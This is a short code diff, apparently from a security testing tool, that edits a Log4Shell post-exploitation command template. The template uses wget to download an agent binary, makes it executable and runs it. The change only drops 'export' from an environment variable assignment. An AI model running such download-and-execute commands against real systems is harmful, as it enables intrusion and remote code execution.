@@ -41,7 +41,7 @@ CHECK_COMMAND = "echo %s" % ID_STRING
 
 LOG4SHELL_LINUX_COMMAND = (
     "wget -O %(monkey_path)s %(http_path)s ;"
-    "export %(agent_otp_environment_variable)s=%(agent_otp)s ;"
+    "%(agent_otp_environment_variable)s=%(agent_otp)s ;"
     "chmod +x %(monkey_path)s ;"
     " %(monkey_path)s %(monkey_type)s %(parameters)s"
 )
